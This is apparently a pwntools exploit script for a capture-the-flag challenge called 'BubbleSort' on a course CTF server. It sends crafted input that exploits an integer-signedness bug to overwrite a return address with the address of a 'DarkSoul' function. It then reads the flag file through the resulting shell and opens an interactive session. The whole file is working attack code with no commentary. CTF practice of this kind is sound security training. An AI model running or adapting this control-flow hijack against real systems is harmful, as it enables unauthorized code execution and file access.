import ctypes
from pwn import *
PORT = 10121

binary_name = 'BubbleSort'
elf = ELF(binary_name, checksec=False)

r = remote('csie.ctf.tw', PORT)

len_to_ret = str(ctypes.c_int32(int('0xFFFFFF'+hex(127+4)[2:], 16)).value)
r.sendline('127')
r.sendline('0 '*126+str(elf.symbols['DarkSoul']))
r.sendline(len_to_ret)

r.recvline()
r.recvline()
r.sendline('cat /home/'+binary_name+'/flag')

print r.recvuntil('}')
r.interactive()
